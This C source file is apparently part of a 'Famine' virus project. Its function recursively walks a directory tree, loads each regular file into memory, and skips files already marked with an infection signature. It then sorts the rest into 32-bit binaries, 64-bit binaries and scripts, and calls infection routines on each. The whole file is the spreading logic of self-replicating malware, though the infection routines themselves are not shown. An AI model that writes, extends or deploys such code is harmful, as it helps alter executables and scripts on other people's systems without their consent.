#include <ft_famine.h>

static bool handle_file_format(t_binary *binary)
{
    if(check_file_arch(binary))
        return true;
    if(check_script_format(binary))
        return true;
    return false;
}

static bool already_infected(t_binary *binary, const char *famine)
{
    if(!memmem(binary->buffer, binary->file_size, famine, strlen(famine)))
        return false;
    return true;
}

int file_handler(char *path, bool recursive)
{
    struct dirent   *dir;
    DIR             *tmp = opendir(path);
    int             ret = 0;
    char            *full_path;
    if(tmp)
    {
        while((dir = readdir(tmp)) != NULL)
        {
            if(recursive)
            {
                if(!ft_strcmp(dir->d_name, ".") || !ft_strcmp(dir->d_name, ".."))
                    continue;
                if(dir->d_type == DT_DIR)
                {
                    full_path = build_path(path, dir->d_name);
                    if(full_path)
                    {
                        ret = file_handler(full_path, true);
                        free(full_path);
                        full_path = NULL;
                    }
                    continue;
                }   
            }
            if(dir->d_type == DT_REG)
            {
                t_binary *binary = ft_calloc(1, sizeof(t_binary));
                if(!binary)
                {
                    closedir(tmp);
                    return 1;
                }
                full_path = build_path(path, dir->d_name);
                open_binary_in_memory(full_path, binary);
                if(!binary->buffer)
                {
                    free_binary(binary);
                    free(full_path);
                    full_path = NULL;
                    continue;
                }
                if(already_infected(binary, FAMINE))
                {
                    free_binary(binary);
                    free(full_path);
                    full_path = NULL;
                    continue;
                }
                if(!handle_file_format(binary))
                {
                    free_binary(binary);
                    free(full_path);
                    full_path = NULL;
                    continue;
                }
                if(binary->arch == ARCH64)
                    ret = infects_64(binary, full_path);
                else if(binary->arch == ARCH32)
                    ret = infects_32(binary, full_path);
                else
                    ret = infects_script(binary, full_path);
                free_binary(binary);
                free(full_path);
                full_path = NULL;
            }
        }
        closedir(tmp);
    }
    return ret;
}